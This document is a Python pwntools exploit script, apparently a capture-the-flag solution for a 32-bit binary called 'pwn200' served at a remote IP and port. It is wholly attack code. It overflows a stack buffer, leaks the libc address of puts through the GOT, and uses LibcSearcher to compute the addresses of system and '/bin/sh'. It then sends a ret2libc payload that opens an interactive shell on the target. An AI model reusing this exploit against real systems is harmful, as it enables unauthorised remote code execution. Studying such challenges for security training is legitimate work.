from pwn import *
from LibcSearcher import *
context(log_level="Debug", arch="i386", os="linux")
e = ELF("./pwn200")
io = process("./pwn200")
io = remote("114.55.66.54", 10001)
# gdb.attach(io)

start_addr = e.sym["_start"]
puts_addr = e.sym["puts"]
puts_got = e.got["puts"]
log.info("The got of puts is " + hex(puts_got))
payload1 = "A" * 0x24
payload1 += p32(puts_addr)
payload1 += p32(start_addr)
payload1 += p32(puts_got)
io.recvuntil("it :D?")
io.sendline(payload1)
io.recv()
puts_libc_addr = u32(io.recv()[:4].ljust(4, "\x00"))
log.info("Function puts addr in libc is " + hex(puts_libc_addr))

libc = LibcSearcher("puts", puts_libc_addr)
base_addr = puts_libc_addr - libc.dump("puts")
system_addr = libc.dump("system") + base_addr
bin_sh = libc.dump("str_bin_sh") + base_addr
log.info("The system address is " + hex(system_addr))
log.info("The string \"/bin/sh\" address is " + hex(bin_sh))

payload2 = "A" * 0x24
payload2 += p32(system_addr)
payload2 += "A" * 4
payload2 += p32(bin_sh)

io.sendline(payload2)
io.interactive()
